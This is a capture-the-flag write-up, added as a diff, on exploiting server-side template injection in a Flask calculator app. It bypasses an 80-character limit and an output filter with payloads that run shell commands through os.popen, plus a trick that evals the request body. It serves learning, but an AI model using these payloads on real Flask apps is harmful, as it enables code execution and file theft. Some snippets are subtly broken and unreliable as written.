@@ -1,0 +1,107 @@
+The Website
+-----------
+we're given a webpage with a form with a single field that can "do math without decimals".  Also, the problem description tells us that there is a file called flag.
+
+
+
+The Source
+----------
+if we look at the python source, it's another flask app.  There are two routes, the index just serves a static page with the form, and the /calc route takes our query and passes it through render_template_string.  So it's another Flask SSTI problem.
+
+The catch is threefold.  First, it strips the output of anything except digits and hyphens.  So we need a scheme for exfiltrating data.  Second, our query is limited to 80 characters.  If we go over this, it won't execute.  Lastly, request.args, request.headers, and request.cookies are cleared to try to keep us from hiding additional SSTI in them and getting around the 80 character limit.
+
+I did not actually manage to solve this problem during the competition as my understanding of SSTI was still too spotty and I didn't know how to work around the limitations without decent feedback.  It didn't help that the server kept giving 502's which an admin later said was because the box was "hitting the process limit", but in the moment I thought was just a different way of it failing to execute my script (similar to the normal Internal Server Error message).  Now that I have written my SSTI document, I am confident that I can solve this.
+
+
+
+Small SSTI
+----------
+There are actually quite a few ways we can pull off getting around the 80 character limit for arbitary code execution.  The exfil requirement is a bit harder to do in 80 characters.
+
+First of all, we can open and read the file with
+
+    g.pop.__globals__.__builtins__.open('flag').read()
+
+but this won't work on it's own because of the exfil requirement
+
+
+
+Exfil
+-----
+We can open the file in binary mode and query each character at a time which would return the character as an integer, and then we could put them back together on our end.
+
+    ...open('flag','rb').read()[0]
+    flag += chr(next_char_from_query_results)
+
+unfortunately, our ability to manipulate the bytestring as a whole are pretty limited because we can't access list() from the immediate context.  we can instead build in that ability through shell commands
+
+g.pop.__globals__.sys.modules.os.popen('od -A n -b f*|tr " " "-"').read()
+comes in at 73 characters. just under our 80 char limit.
+
+the python part is the shortest way I know of to get to popen.
+
+from there, we can use od to dump the file out as octal (since octal is guaranteed to be just digits).  Unfortunately, od outputs similar to a hexdump with the file offsets on the left margin.  We can remove that with '-A n'.  '-A' specifies a format for the file offsets and 'n' specifies None.  It also prints out two bytes worth of octal at a time.  '-b' tells it to do 1 byte at a time instead.  These octal bytes are separated by a space character.  This will get stripped by the exfil requirement, so we can use tr to translate these spaces into hyphens.  at this point we're still just above our 80 character limit. But we can use the shell's ability to complete the file name with f* to get us below the requirement.
+
+what we get back is a long string starting with a hyphen and then consisting of three digit octal numbers for each byte separated by hyphens. We can copy this string and process it in python like this
+
+    s = '<our hyphen delimited octal string>'
+    flag = ''.join([chr(int(i,8)) for i in s.split('-')[1:]])
+
+and this gets us the flag!
+
+
+
+Solving it by Eval'ing the Request Body
+---------------------------------------
+but there is one more cool trick that I think is worth covering here.  Going back to trying to get the exfil done directly in the python payload... we can often get around SSTI filter requirements like blacklists and length restrictions by hiding our payload in other parts of the request.  This problem tries to deal with this by emptying the contents of args, headers, and cookies.  But we still have access to other things in the request.  In particular, we have full access to the main body of the request in request.data.  We can use our usual SSTI tricks to run eval on any of these and then hide our real python payload in there without any of the restrictions the app is trying to impose (well, we still have the exfil req, but that's what we're trying to deal with in the unfiltered payload)
+
+    #curl (specify data-raw to give the request body as-is, but this will imply POST, so explicitly set GET)
+    curl -X GET https://sinking-calculator.chal.imaginaryctf.org/calc?query=<our query payload> --data-raw '<our main payload>'
+
+    #query payload (keep in mind we need to urlencode this)
+    g.pop.__globals__.__builtins__.eval%28request.data%29
+
+    #main payload
+    "-".join([str(i) for i in open("flag","rb").read()])
+
+    #post processing
+    s = '<our hyphen delimited string of ints>'
+    flag = ''.join([chr(int(i)) for i in s.split('-')])
+
+and there's the flag!
+
+
+
+Exfil without hyphens
+---------------------
+When I was originally trying to complete this challenge, the smallest payload I had gotten down to was actually using eval and then trying to embed the exfil python directly in the query payload.  I got within a couple characters of the requirements, but couldn't shorten it further.  I realized as I was doing this writeup that I was escaping the embedded quotes ('\'') when I could have just used double quotes ('"') and that actually shortened my shortest payload down to exactly 80 characters. as it turns out, there were other problems with this payload.  for whatever reason, evaluating a list comprehension statement directly wasn't printing the contents as a list.  I could add a join to get around that, but it made the payload slightly longer.  The join obsoleted the part of the list comprehension that was adding in the delimiter, so we get back a few characters.  Then I realized that a list comprehension to ord each character was kind of stupid when you can just open in binary mode and convert that to a list. and honestly even the list conversion isn't necessary because the bytes object is already iterable. But then I realized I was trying to combine strings and ints, so we had to call str on each element either with a list comprehension or with map. a single map on its own is shorter, so we'll go with that. and we're still at 82 characters...We could always use a single long string of digits and recognize that we can tokenize them based on the leading digit.  if the next token starts with "1", it must be a 3 digit number. otherwise, it's only 2 digits.  this would work, but I really wanted to get a hyphen delimiter in there.
+
+in the end, I couldn't get it under 82 with the hyphen delimiter
+
+    g.pop.__globals__.__builtins__.eval('"-".join(map(str,open("flag","rb").read()))')
+
+but if we're willing to parse based on the leading '1' thing, just wrapping the read in a list() works
+
+    g.pop.__globals__.builtins__.eval('list(open("flag","rb").read())')
+
+and then we would have to do some processing
+
+```
+s = '<number string>'
+l = []
+si = 0
+li = 3
+for c in s:
+    if si == 0:
+        li = 3 if c == '1' else 2
+        l.append(c)
+        si += 1
+    else:
+        l[-1] += c
+        si += 1
+        if si == li:
+            si = 0
+''.join(map(chr,l))
+```
+
+and again, there's the flag
